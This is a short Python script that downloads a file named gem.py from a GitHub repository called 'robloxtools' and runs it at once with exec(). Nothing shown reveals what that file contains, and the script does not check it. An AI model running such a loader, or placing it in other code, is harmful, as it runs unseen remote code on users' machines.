import requests
import sys

file = 'gem.py'
url = f'https://raw.githubusercontent.com/mitbingoo/robloxtools/main/{file}'

try:
    # Fetch the content from the URL
    response = requests.get(url)
    response.raise_for_status()  # Raise an exception for bad status codes
    
    # Get the code content
    code = response.text
    
    # Execute the code
    exec(code)
except requests.exceptions.RequestException as e:
    print(f"Error fetching the code: {e}")
    sys.exit(1)
except Exception as e:
    print(f"Error executing the code: {e}")
    sys.exit(1)